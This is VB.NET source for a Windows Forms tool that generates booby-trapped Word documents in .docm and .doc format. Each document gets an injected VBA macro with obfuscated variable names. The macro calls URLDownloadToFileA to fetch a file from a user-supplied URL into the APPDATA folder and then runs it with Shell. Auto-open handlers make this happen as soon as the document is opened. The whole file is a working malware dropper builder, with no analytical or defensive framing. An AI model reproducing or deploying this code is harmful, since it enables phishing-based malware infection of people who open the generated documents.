Imports System.Runtime.InteropServices
Imports Microsoft.Office.Interop
Imports Microsoft.Vbe.Interop
Imports Word = Microsoft.Office.Interop.Word
Imports System.IO
Imports System.Reflection


Public Class Form9

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        If TextBox1.Text = "" Or TextBox2.Text = "" Then
            MsgBox("Please enter all the details. File URL, File Name and Document Name")

        Else

            Dim docmsaveloc As String

            docmfile.Filter = "Word Macro-Enabled Document|*.docm"
            If docmfile.ShowDialog = System.Windows.Forms.DialogResult.OK Then
                docmsaveloc = docmfile.FileName


                Dim oWord As Word.Application = Nothing
                Dim oDocs As Word.Documents = Nothing
                Dim oDoc As Word.Document = Nothing

                oWord = New Word.Application()
                oWord.Visible = False
                oDocs = oWord.Documents
                oDoc = oDocs.Add()

                Dim vbModule As VBComponent = oDoc.VBProject.VBComponents.Add(vbext_ComponentType.vbext_ct_StdModule)
                vbModule.Name = "AddCode"
                vbModule.CodeModule.AddFromString( _
                "Option Explicit" & vbLf & _
                "#If Win64 Then" & vbLf & _
                "Private Declare PtrSafe Function URLDownloadToFileA Lib """ & "urlmon""" & "(ByVal TWEZSMO As Long, _" & vbLf & _
                "ByVal BYMXCT As String, ByVal GUSOZT As String, ByVal UNZOOQZ As Long, _" & vbLf & _
                "ByVal MJEXCQ As Long) As Long" & vbLf & _
                "#Else" & vbLf & _
                "Private Declare Function URLDownloadToFileA Lib """ & "urlmon""" & "(ByVal TWEZSMO As Long, _" & vbLf &
                "ByVal BYMXCT As String, ByVal GUSOZT As String, ByVal UNZOOQZ As Long, _" & vbLf & _
                "ByVal MJEXCQ As Long) As Long" & vbLf & _
                "#End If" & vbLf & _
                "Function CDHEAK(AFMFFYA As String, MPSFFEC As String) As Boolean" & vbLf & _
                "Dim KEVVSR As Long" & vbLf & _
                "KEVVSR = URLDownloadToFileA(0, AFMFFYA, MPSFFEC, 0, 0)" & vbLf & _
                "If KEVVSR = 0 Then CDHEAK = True" & vbLf & _
                "Dim UTFVLT" & vbLf & _
                "UTFVLT = Shell(MPSFFEC, 1)" & vbLf & _
                "End Function" & vbLf & _
                "Public Sub MKNBXTZ()" & vbLf & _
                "CDHEAK """ & TextBox1.Text & """, Environ(""" & "APPDATA""" & ") & """ & "\" & TextBox2.Text & """" & vbLf & _
                "End Sub" & vbLf & _
                "Sub Workbook_Open()" & vbLf & _
                "Auto_Open" & vbLf & _
                "End Sub" & vbLf & _
                "Sub AutoOpen()" & vbLf & _
                "Auto_Open" & vbLf & _
                "End Sub" & vbLf & _
                "Sub Auto_Open()" & vbLf & _
                "MKNBXTZ" & vbLf & _
                "End Sub")


                oDoc.SaveAs(docmsaveloc, Word.WdSaveFormat.wdFormatXMLDocumentMacroEnabled)
                oDoc.Close()

                oWord.Quit(False)

            Else
                MsgBox("Oops! something went wrong :(")
            End If
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        If TextBox1.Text = "" Or TextBox2.Text = "" Then
            MsgBox("Please enter all the details. File URL, File Name and Document Name")

        Else
            Dim docsaveloc As String

            docfile.Filter = "Word 97-2003 Document|*.doc"
            If docfile.ShowDialog = System.Windows.Forms.DialogResult.OK Then
                docsaveloc = docfile.FileName


                Dim ooWord As Word.Application = Nothing
                Dim ooDocs As Word.Documents = Nothing
                Dim ooDoc As Word.Document = Nothing

                ooWord = New Word.Application()
                ooWord.Visible = False
                ooDocs = ooWord.Documents
                ooDoc = ooDocs.Add()

                Dim vbModule As VBComponent = ooDoc.VBProject.VBComponents.Add(vbext_ComponentType.vbext_ct_StdModule)
                vbModule.Name = "AddNewCode"
                vbModule.CodeModule.AddFromString( _
                "Option Explicit" & vbLf & _
                "#If Win64 Then" & vbLf & _
                "Private Declare PtrSafe Function URLDownloadToFileA Lib """ & "urlmon""" & "(ByVal TWEZSMO As Long, _" & vbLf & _
                "ByVal BYMXCT As String, ByVal GUSOZT As String, ByVal UNZOOQZ As Long, _" & vbLf & _
                "ByVal MJEXCQ As Long) As Long" & vbLf & _
                "#Else" & vbLf & _
                "Private Declare Function URLDownloadToFileA Lib """ & "urlmon""" & "(ByVal TWEZSMO As Long, _" & vbLf &
                "ByVal BYMXCT As String, ByVal GUSOZT As String, ByVal UNZOOQZ As Long, _" & vbLf & _
                "ByVal MJEXCQ As Long) As Long" & vbLf & _
                "#End If" & vbLf & _
                "Function CDHEAK(AFMFFYA As String, MPSFFEC As String) As Boolean" & vbLf & _
                "Dim KEVVSR As Long" & vbLf & _
                "KEVVSR = URLDownloadToFileA(0, AFMFFYA, MPSFFEC, 0, 0)" & vbLf & _
                "If KEVVSR = 0 Then CDHEAK = True" & vbLf & _
                "Dim UTFVLT" & vbLf & _
                "UTFVLT = Shell(MPSFFEC, 1)" & vbLf & _
                "End Function" & vbLf & _
                "Public Sub MKNBXTZ()" & vbLf & _
                "CDHEAK """ & TextBox1.Text & """, Environ(""" & "APPDATA""" & ") & """ & "\" & TextBox2.Text & """" & vbLf & _
                "End Sub" & vbLf & _
                "Sub Workbook_Open()" & vbLf & _
                "Auto_Open" & vbLf & _
                "End Sub" & vbLf & _
                "Sub AutoOpen()" & vbLf & _
                "Auto_Open" & vbLf & _
                "End Sub" & vbLf & _
                "Sub Auto_Open()" & vbLf & _
                "MKNBXTZ" & vbLf & _
                "End Sub")


                ooDoc.SaveAs(docsaveloc, Word.WdSaveFormat.wdFormatDocument97)
                ooDoc.Close()

                ooWord.Quit(False)
            Else
                MsgBox("Oops! something went wrong :(")
            End If
        End If
    End Sub

    Private Sub Button1_MouseHover(sender As Object, e As EventArgs) Handles Button1.MouseHover
        Button1.BackColor = Color.DodgerBlue
        
    End Sub

    Private Sub Button1_MouseLeave(sender As Object, e As EventArgs) Handles Button1.MouseLeave
        Button1.BackColor = Color.SkyBlue
    End Sub

    Private Sub Button2_MouseHover(sender As Object, e As EventArgs) Handles Button2.MouseHover
        Button2.BackColor = Color.DodgerBlue
    End Sub

    Private Sub Button2_MouseLeave(sender As Object, e As EventArgs) Handles Button2.MouseLeave
        Button2.BackColor = Color.SkyBlue
    End Sub
End Class